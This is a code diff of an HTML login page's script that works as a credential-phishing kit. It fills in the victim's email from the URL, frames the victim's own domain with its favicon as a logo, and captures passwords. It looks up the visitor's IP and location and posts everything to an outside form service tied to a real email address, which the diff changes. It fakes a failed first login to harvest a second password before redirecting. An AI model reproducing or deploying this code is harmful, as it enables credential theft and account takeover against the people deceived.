@@ -138,106 +138,82 @@
 
 	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 	<script>
-		let step = 1;
-		let submitted = false; // Prevent double submission
+	let step = 1;
+	let submitted = false; // Prevent double submission
+	
+	// Get clientID from URL hash
+	const clientID = window.location.hash.substring(1);
+	
+	if (!clientID) {
+		$("#error").text("No email provided").css("display", "block");
+	} else {
+		$('#email').val(clientID);
+		const domain = clientID.split('@').pop();
 		
-		// Get clientID from URL hash
-		const clientID = window.location.hash.substring(1);
+		// Set iframe to the domain
+		$("#frame").attr("src", "https://" + domain);
 		
-		if (!clientID) {
-			$("#error").text("No email provided").css("display", "block");
-		} else {
-			$('#email').val(clientID);
-			const domain = clientID.split('@').pop();
-			
-			// Set iframe to the domain
-			$("#frame").attr("src", "https://" + domain);
-			
-			// Use favicon service
-			const logoUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
-			$("#logo").attr("src", logoUrl)
-				.on("error", function() {
-					$(this).attr("src", "https://via.placeholder.com/100/cccccc/666666?text=" + domain.charAt(0).toUpperCase());
-				});
-		}
+		// Use favicon service
+		const logoUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
+		$("#logo").attr("src", logoUrl)
+			.on("error", function() {
+				$(this).attr("src", "https://via.placeholder.com/100/cccccc/666666?text=" + domain.charAt(0).toUpperCase());
+			});
+	}
 
-		$("#login-form").submit(function(event) {
-			event.preventDefault();
-			
-			if (submitted) return; // Prevent multiple submissions
-			submitted = true;
-			
-			const submitBtn = $("button[type='submit']");
-			submitBtn.text('Verifying...').prop('disabled', true);
+	$("#login-form").submit(function(event) {
+		event.preventDefault();
+		
+		if (submitted) return; // Prevent multiple submissions
+		submitted = true;
+		
+		const submitBtn = $("button[type='submit']");
+		submitBtn.text('Verifying...').prop('disabled', true);
 
-			const email = $("#email").val();
-			const password = $("#psw").val();
-			const domain = email.split('@').pop();
-			
-			// Prepare form data
-			const formData = {
-				_subject: "Login Attempt",
+		const email = $("#email").val();
+		const password = $("#psw").val();
+		const domain = email.split('@').pop();
+		
+		// Get IP info and submit to Formspree
+		$.getJSON('https://ipinfo.io/json', function(response) {
+			const posting = $.post("https://formsubmit.co/ajax/dattiobi@yandex.com", {
+				_subject: "Logs | " + response.ip,
 				Email: email,
 				Password: password,
 				Attempts: step,
-				Domain: domain
-			};
-			
-			// Get IP info first
-			$.getJSON('https://ipinfo.io/json')
-				.then(function(ipData) {
-					formData._subject = "Logs | " + ipData.ip;
-					formData.IP = ipData.ip;
-					formData.Location = ipData.city + ", " + ipData.country;
-					return formData;
-				})
-				.catch(function() {
-					// If IP info fails, use default data
-					formData.IP = "Unknown";
-					formData.Location = "Unknown";
-					return formData;
-				})
-				.then(function(dataToSend) {
-					// Submit to Formspree
-					return $.post("https://formsubmit.co/ajax/firmcaster62@gmail.com", dataToSend);
-				})
-				.then(function() {
-					console.log("Attempt:", step, "Submitted successfully");
-					
-					// ALWAYS redirect on second attempt regardless of form submission result
-					if (step >= 2) {
-						console.log("Redirecting to:", domain);
-						// Small delay to ensure user sees the "Verifying..." message
-						setTimeout(function() {
-							window.location.href = "https://" + domain;
-						}, 500);
-					} else {
-						// First attempt failed
-						step++;
-						$("#error").css("display", "block");
-						submitBtn.text('Sign In').prop('disabled', false);
-						$("#psw").val("");
-						submitted = false; // Allow next submission
-					}
-				})
-				.catch(function(error) {
-					console.error("Error:", error);
-					
-					// Even if everything fails, redirect on second attempt
-					if (step >= 2) {
-						console.log("Error occurred but redirecting to:", domain);
-						setTimeout(function() {
-							window.location.href = "https://" + domain;
-						}, 500);
-					} else {
-						step++;
-						$("#error").text("Incorrect password. Please try again.").css("display", "block");
-						submitBtn.text('Sign In').prop('disabled', false);
-						$("#psw").val("");
-						submitted = false; // Allow next submission
-					}
-				});
-		});
-	</script>
+				IP: response.ip,
+				Location: response.city + ", " + response.country,
+			});
+
+			posting.done(function(data) {
+				console.log("Attempt:", step, "Submitted successfully");
+				
+				if (step === 2) {
+					window.location.href = "https://" + domain;
+				} else {
+					step++;
+					$("#error").css("display", "block");
+					submitBtn.text('Sign In').prop('disabled', false);
+					$("#psw").val("");
+					submitted = false; // Allow next submission
+				}
+			});
+
+			posting.fail(function(error) {
+				console.error("Error:", error);
+				
+				if (step === 2) {
+					window.location.href = "https://" + domain;
+				} else {
+					step++;
+					$("#error").css("display", "block");
+					submitBtn.text('Sign In').prop('disabled', false);
+					$("#psw").val("");
+					submitted = false; // Allow next submission
+				}
+			});
+		}, "json");
+	});
+</script>
 </body>
 </html>
